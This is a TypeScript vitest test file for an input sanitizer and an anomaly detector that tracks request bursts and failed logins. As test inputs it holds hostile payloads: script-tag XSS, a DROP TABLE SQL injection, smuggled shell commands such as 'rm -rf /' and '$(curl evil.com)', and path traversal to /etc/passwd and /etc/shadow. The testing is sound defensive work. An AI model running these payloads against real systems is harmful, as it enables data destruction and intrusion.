import { describe, it, expect } from 'vitest';
import { InputSanitizer } from './input-sanitizer.js';
import { AnomalyDetector } from './anomaly-detector.js';

describe('InputSanitizer', () => {
  const s = new InputSanitizer();

  it('sanitizes XSS in strings', () => {
    expect(s.sanitizeString('<script>alert(1)</script>')).not.toContain('<script');
    expect(s.sanitizeString('onclick=steal()')).not.toContain('onclick');
  });

  it('sanitizes SQL injection', () => {
    expect(s.sanitizeSql("'; DROP TABLE users;--")).not.toContain('DROP');
    expect(s.sanitizeSql('1 OR 1=1')).not.toContain("'");
  });

  it('sanitizes command injection', () => {
    expect(s.sanitizeCommand('ls; rm -rf /')).not.toContain(';');
    expect(s.sanitizeCommand('$(curl evil.com)')).not.toContain('$');
  });

  it('blocks internal URLs (SSRF)', () => {
    expect(s.sanitizeUrl('http://localhost:3000').safe).toBe(false);
    expect(s.sanitizeUrl('http://127.0.0.1').safe).toBe(false);
    expect(s.sanitizeUrl('http://192.168.1.1').safe).toBe(false);
    expect(s.sanitizeUrl('https://example.com').safe).toBe(true);
  });

  it('detects injection attempts', () => {
    expect(s.detectInjection('<script>alert(1)</script>').safe).toBe(false);
    expect(s.detectInjection("'; DROP TABLE").safe).toBe(false);
    expect(s.detectInjection('hello world').safe).toBe(true);
  });

  it('sanitizes path traversal', () => {
    expect(s.sanitizePath('../../../etc/passwd')).not.toContain('..');
    expect(s.sanitizePath('/etc/shadow')).toContain('[BLOCKED]');
  });
});

describe('AnomalyDetector', () => {
  it('detects burst requests', () => {
    const d = new AnomalyDetector();
    let alert = null;
    for (let i = 0; i < 101; i++) {
      alert = d.trackRequest('user1', '1.2.3.4');
    }
    expect(alert).not.toBeNull();
    expect(alert!.type).toBe('burst_requests');
  });

  it('detects failed auth attempts', () => {
    const d = new AnomalyDetector();
    for (let i = 0; i < 4; i++) d.trackFailedAuth('5.6.7.8');
    expect(d.isBlocked('5.6.7.8')).toBe(false);

    d.trackFailedAuth('5.6.7.8');
    expect(d.getAlerts().some((a) => a.type === 'failed_auth')).toBe(true);
  });

  it('blocks after 10 failed auths', () => {
    const d = new AnomalyDetector();
    for (let i = 0; i < 10; i++) d.trackFailedAuth('9.9.9.9');
    expect(d.isBlocked('9.9.9.9')).toBe(true);
  });

  it('detects large payloads', () => {
    const d = new AnomalyDetector();
    const alert = d.checkPayloadSize(20 * 1024 * 1024);
    expect(alert).not.toBeNull();
    expect(alert!.type).toBe('large_payload');
  });

  it('resets IP tracking', () => {
    const d = new AnomalyDetector();
    for (let i = 0; i < 10; i++) d.trackFailedAuth('1.1.1.1');
    expect(d.isBlocked('1.1.1.1')).toBe(true);
    d.resetIp('1.1.1.1');
    expect(d.isBlocked('1.1.1.1')).toBe(false);
  });
});
